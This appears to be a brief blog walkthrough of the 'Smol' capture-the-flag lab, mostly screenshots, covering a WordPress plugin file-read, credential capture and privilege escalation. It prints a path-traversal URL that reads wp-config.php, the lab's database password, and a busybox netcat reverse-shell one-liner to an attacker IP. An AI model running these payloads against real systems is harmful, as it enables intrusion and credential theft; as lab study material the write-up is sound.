---

title: "Smol"  
date: "2025-4-16"  
thumbnail: "/assets/img/thumbnail/smol.png"

---

# Smol
---
**Challenges Difficulty: Medium**  
**Category: Privilege Escalation**

---
## Initial Access

```bash
wpscan --url [http://www.smol.thm](http://www.smol.thm/)
```

![image.png](/assets/img/posts/smol/image%2016.png)

![image.png](/assets/img/posts/smol/image%2017.png)

[http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php](http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php)

![image.png](/assets/img/posts/smol/image%2018.png)

```bash
/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );
```

from the comment section we can get to a log in page

![image.png](/assets/img/posts/smol/image%2019.png)

![image.png](/assets/img/posts/smol/image%2020.png)

![image.png](/assets/img/posts/smol/image%2021.png)

just for fun 😂

![image.png](/assets/img/posts/smol/image%2022.png)

![image.png](/assets/img/posts/smol/image%2023.png)

![image.png](/assets/img/posts/smol/image%2024.png)

![image.png](/assets/img/posts/smol/image%2025.png)

![image.png](/assets/img/posts/smol/image%2026.png)

`busybox nc **10.11.130.37** **4444** -e **sh**`

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![image.png](/assets/img/posts/smol/image%2027.png)

![image.png](/assets/img/posts/smol/image%2028.png)

sandiegocalifornia

![image.png](/assets/img/posts/smol/image%2029.png)

- [x]  sudo -l
- [x]  /cat /etc/crontab
- [x]  suid
- [x]  capabilitys

![image.png](/assets/img/posts/smol/image%2030.png)

![image.png](/assets/img/posts/smol/image%2031.png)

![image.png](/assets/img/posts/smol/image%2032.png)

latral movment

![image.png](/assets/img/posts/smol/image%2033.png)

![image.png](/assets/img/posts/smol/image%2034.png)

![image.png](/assets/img/posts/smol/image%2035.png)

![image.png](/assets/img/posts/smol/image%2036.png)

![image.png](/assets/img/posts/smol/image%2037.png)

![image.png](/assets/img/posts/smol/image%2038.png)